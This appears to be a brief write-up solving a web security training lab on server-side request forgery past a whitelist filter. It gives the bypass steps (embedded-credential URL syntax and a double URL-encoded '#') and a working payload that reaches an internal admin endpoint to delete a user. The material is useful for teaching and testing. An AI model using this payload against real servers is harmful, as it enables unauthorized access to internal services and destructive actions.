# SSRF with whitelist-based input filter
Solution:
- Use the format http://evil-domain@actual-domain
- This gets accepted by the server
- Try with http://127.0.0.1#@stock.weliketoshop.net:8080
- It gets blocked. Try URL-encoding it. Still gets blocked.
- URL-encode again
	- \# -> %23 -> %2523
	- Bypassed
- To access the `/admin` panel, append it to the end of the url
```js
stockApi=http://127.0.0.1%2523@stock.weliketoshop.net:8080/admin/delete?username=carlos
```